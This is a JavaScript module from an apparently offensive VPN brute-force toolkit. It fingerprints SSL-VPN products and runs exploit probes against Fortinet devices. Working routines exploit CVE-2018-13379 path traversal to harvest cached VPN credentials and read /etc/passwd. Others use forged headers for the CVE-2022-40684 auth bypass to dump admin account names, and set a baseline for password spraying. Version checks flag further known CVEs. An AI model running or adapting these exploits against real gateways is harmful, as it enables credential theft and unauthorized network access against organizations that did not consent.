'use strict';
// Product fingerprints (from VPN_Brute 1.2.0 param presets, extended) and
// exploit / harvest probes for Fortinet gear.
const forti = require('./forti');

const PRESETS = {
    fortinet: {
        name: 'Fortinet FortiGate SSL-VPN',
        paths: ['remote/login', 'login?redir=', 'remote/login?lang=en'],
        patternLogin: 'fortinet;remote/logincheck',
        patternAdmin: 'hostcheck_install?auth_type',
    },
    cisco: {
        name: 'Cisco ASA AnyConnect',
        paths: ['+CSCOE+/logon.html'],
        patternLogin: '+cscoe+',
        patternAdmin: 'webvpn_tcp',
    },
    watchguard: {
        name: 'WatchGuard SSL-VPN',
        paths: ['sslvpn_logon.shtml'],
        patternLogin: 'watchguard technologies',
        patternAdmin: 'sslvpn_download.shtml',
    },
    citrix: {
        name: 'Citrix NetScaler Gateway',
        paths: ['vpn'],
        patternLogin: 'citrix',
        patternAdmin: 'login successful',
    },
    pulse: {
        name: 'Pulse / Ivanti Secure Access',
        paths: ['dana-na'],
        patternLogin: 'dana-na',
        patternAdmin: 'dsidconfirmform;useruimenu',
    },
    globalprotect: {
        name: 'Palo Alto GlobalProtect',
        paths: ['global-protect/login.esp'],
        patternLogin: 'globalprotect',
        patternAdmin: 'getsoftwarepage.esp',
    },
};

function ver(s) {
    const m = String(s || '').match(/(\d+)\.(\d+)\.(\d+)/);
    return m ? [Number(m[1]), Number(m[2]), Number(m[3])] : null;
}
function lte(a, b) {
    const x = ver(a), y = ver(b);
    if (!x || !y) return false;
    for (let i = 0; i < 3; i++) {
        if (x[i] < y[i]) return true;
        if (x[i] > y[i]) return false;
    }
    return true;
}

const EXPLOITS = [
    {
        id: 'CVE-2018-13379',
        name: 'FortiOS pre-auth path traversal → sslvpn_websession (VPN creds)',
        weight: 10,
        async run(url, { opts }) {
            const hit = await forti.harvestSession(url, opts);
            if (hit) {
                return {
                    vulnerable: true, status: 200, creds: hit.creds, path: hit.path,
                    detail: `websession leaked (${hit.creds.length} pair(s))`,
                };
            }
            // /etc/passwd proves traversal even when no sessions are cached
            for (const p of forti.PATHS.passwd) {
                const res = await require('./http').request(forti.baseOf(url) + p, { timeout: opts.timeout, maxBody: 32 * 1024, retries: 0 });
                if (res.ok && /root:.*:0:0:/.test(res.body || '')) {
                    return { vulnerable: true, status: res.status, creds: [], path: p, detail: 'traversal via /etc/passwd (no sessions cached)' };
                }
            }
            return { vulnerable: false, detail: 'no traversal' };
        },
    },
    {
        id: 'CVE-2022-40684',
        name: 'FortiOS/FortiProxy auth bypass (/api/v1/cmdb/system/admin)',
        weight: 9,
        async run(url, { opts }) {
            const res = await require('./http').request(forti.baseOf(url) + '/api/v1/cmdb/system/admin', {
                timeout: opts.timeout, maxBody: 48 * 1024, retries: 0,
                headers: {
                    Forwarded: 'for="[127.0.0.1]:8000;by="[127.0.0.1]:9000"',
                    'X-Forwarded-Vdom': 'root',
                    'User-Agent': 'Report Runner',
                },
            });
            const body = res.body || '';
            const vuln = res.ok && res.status === 200 && /"http_method"|"q_origin_key"|"accprofile"/i.test(body);
            return {
                vulnerable: vuln, status: res.status,
                detail: vuln ? 'admin table readable unauthenticated' : 'no bypass',
                accounts: vuln ? (body.match(/"name"\s*:\s*"([^"]+)"/g) || []).slice(0, 10).map(s => s.replace(/.*"([^"]+)"$/, '$1')) : [],
            };
        },
    },
    {
        id: 'FGT-XML-SNIFF',
        name: 'Unauthenticated fortisslvpn_xml recon (host, version)',
        weight: 6,
        async run(url, { info, opts }) {
            const res = await require('./http').request(forti.baseOf(url) + forti.PATHS.xml, { timeout: opts.timeout, maxBody: 32 * 1024, retries: 0 });
            const body = res.body || '';
            const v = body.match(/<version>\s*([^<\s]+)/i) || body.match(/version="([^"]+)"/i);
            const h = body.match(/<hostname>\s*([^<]+)\s*<\/hostname>/i);
            info.version = v ? v[1] : info.version;
            info.hostname = h ? h[1] : info.hostname;
            return {
                vulnerable: res.ok && res.status === 200 && /<sslvpn_connection|sslvpn/i.test(body),
                status: res.status,
                detail: `version=${info.version || '?'} host=${info.hostname || '?'}`,
            };
        },
    },
    {
        id: 'FGT-LOGINCHECK',
        name: 'Logincheck AJAX semantics probe (cred-spray baseline)',
        weight: 4,
        async run(url, { opts }) {
            const res = await require('./http').request(forti.baseOf(url) + forti.PATHS.login, {
                method: 'POST', body: 'ajax=1&username=&secretkey=&realm=&redir=%2Fremote%2Findex%2F',
                timeout: opts.timeout, maxBody: 8 * 1024, retries: 0,
            });
            const c = forti.classify(res);
            return { vulnerable: res.ok && /ret=/.test(res.body || ''), status: res.status, detail: `state=${c.state} reason=${c.reason} ret=${c.ret}` };
        },
    },
    {
        id: 'CVE-2024-21762',
        name: 'FortiOS SSL-VPN OOB write (version heuristic)',
        weight: 3,
        async run(url, { info }) {
            const likely = info.version && (lte(info.version, '7.4.2') || lte(info.version, '7.2.6') || lte(info.version, '7.0.12') || lte(info.version, '6.4.14'));
            return { vulnerable: !!likely, detail: likely ? `version ${info.version} in vulnerable range` : `version ${info.version || '?'} probably patched` };
        },
    },
    {
        id: 'CVE-2023-27997',
        name: 'FortiOS XORtigate heap overflow (version heuristic)',
        weight: 3,
        async run(url, { info }) {
            const likely = info.version && (lte(info.version, '7.2.4') || lte(info.version, '7.0.11') || lte(info.version, '6.4.13'));
            return { vulnerable: !!likely, detail: likely ? `version ${info.version} in vulnerable range` : `version ${info.version || '?'} probably patched` };
        },
    },
    {
        id: 'CVE-2022-42475',
        name: 'FortiOS SSL-VPN heap overflow (version heuristic)',
        weight: 3,
        async run(url, { info }) {
            const likely = info.version && (lte(info.version, '7.2.2') || lte(info.version, '7.0.8') || lte(info.version, '6.4.11') || lte(info.version, '6.2.12'));
            return { vulnerable: !!likely, detail: likely ? `version ${info.version} in vulnerable range` : `version ${info.version || '?'} probably patched` };
        },
    },
];

module.exports = { PRESETS, EXPLOITS };
